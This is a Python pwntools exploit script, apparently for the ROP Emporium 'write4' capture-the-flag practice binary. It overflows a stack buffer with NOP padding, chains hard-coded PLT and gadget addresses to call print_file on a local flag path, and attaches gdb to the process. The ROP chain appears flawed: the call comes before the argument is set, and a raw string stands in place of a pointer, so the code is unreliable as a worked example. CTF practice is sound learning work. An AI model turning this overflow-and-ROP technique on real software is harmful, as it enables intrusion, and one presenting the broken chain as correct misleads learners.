#!/usr/bin/env python3
from pwn import *

file = b"/home/lemur/Documents/ctf/rop/write4/flag.txt"

nop = b"\x90"
buffer = 0x20

usefulFunction = p64(0x0000000000400617)
usefulGadgets = p64(0x0000000000400628)
pwnme_plt = p64(0x0000000000400500)
printfile_plt = p64(0x0000000000400510)
pop_rdi = p64(0x0000000000400693)
ret = p64(0x00000000004004e6)

payload = (nop * (buffer + 8)) + printfile_plt + pop_rdi + ret + file

context.update(arch="amd64", os="linux")
p = process("./write4")
gdb.attach(p)

p.send(payload)
print(p.recvall())
